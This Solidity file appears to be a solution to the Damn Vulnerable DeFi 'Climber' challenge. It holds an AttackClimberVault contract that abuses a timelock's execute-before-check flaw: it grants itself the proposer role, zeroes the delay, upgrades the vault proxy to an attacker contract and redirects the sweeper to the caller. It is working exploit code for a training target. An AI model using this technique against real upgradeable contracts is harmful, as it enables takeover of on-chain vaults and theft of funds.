// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "../Problems/damnvulnerabledefi/12/ClimberTimelock.sol";
import "../Problems/damnvulnerabledefi/12/ClimberConstants.sol";
import "hardhat/console.sol";
import "../Problems/damnvulnerabledefi/12/ClimberVault.sol";

contract AttackClimberVault {
    address payable timeLockInstance;
    ClimberVault climberInstance;
    constructor(address payable _timeLockInstance, ClimberVault _climberInstance){
        timeLockInstance = _timeLockInstance;
        climberInstance = _climberInstance;
    }

    function attack(address overridingContract) public {
        address[] memory targets = new address[](5);
        uint256[] memory values = new uint256[](5);
        bytes[] memory dataElements = new bytes[](5);
        targets[0] = address(timeLockInstance);
        targets[1] = address(timeLockInstance);
        targets[2] = address(climberInstance);
        targets[3] = address(climberInstance);
        targets[4] = address(climberInstance);
        values[0] = 0;
        values[1] = 0;
        values[2] = 0;
        values[3] = 0;
        values[4] = 0;
        dataElements[0] = abi.encodeWithSignature("grantRole(bytes32,address)", PROPOSER_ROLE, address(climberInstance));
        dataElements[1] = abi.encodeWithSignature("updateDelay(uint64)", 0);
        dataElements[2] = abi.encodeWithSignature("upgradeTo(address)", overridingContract);
        dataElements[3] = abi.encodeWithSignature("overrideSweeper(address)", msg.sender);
        dataElements[4] = abi.encodeWithSignature("setData(address,address,address,address)",timeLockInstance,address(climberInstance),address(overridingContract),msg.sender);

        ClimberTimelock(timeLockInstance).execute(targets, values, dataElements, 0x0000000000000000000000000000000000000000000000000000000000000001);
    }
}
